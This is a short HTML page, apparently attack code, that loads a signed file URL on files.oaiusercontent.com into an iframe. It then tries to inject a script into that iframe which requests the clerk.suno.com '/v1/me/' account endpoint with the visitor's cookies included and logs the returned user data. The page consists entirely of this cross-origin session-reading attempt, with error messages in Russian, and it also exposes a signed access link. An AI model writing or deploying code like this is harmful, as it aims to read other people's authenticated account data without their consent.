<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fetch from Iframe</title>
</head>
<body>
    <iframe id="exampleIframe" src="https://files.oaiusercontent.com/file-pl6GBzxchTRf339MABHUJlUh?se=2024-10-31T13%3A03%3A31Z&sp=r&sv=2024-08-04&sr=b&rscc=max-age%3D299%2C%20immutable%2C%20private&rscd=attachment%3B%20filename%3Duser.txt&sig=MTbQNoXXiypcaCHBv5wcUMian%2BuUUr3L6zcM0xlDv7Y%3D" width="600" height="400"></iframe>

    <script>
        const iframe = document.getElementById('exampleIframe');

        iframe.onload = function() {
            const innerDoc = iframe.contentDocument || iframe.contentWindow.document;
            
            if (innerDoc) {
                const script = innerDoc.createElement('script');
                
                script.textContent = `
                    fetch('https://clerk.suno.com/v1/me/', {
                        method: 'GET',
                        credentials: 'include'
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok');
                        }
                        return response.json();
                    })
                    .then(data => console.log(data))
                    .catch(error => console.error('Ошибка:', error));
                `;

                innerDoc.body.appendChild(script);
            } else {
                console.error('Не удалось получить доступ к contentDocument');
            }
        };
    </script>
</body>
</html>
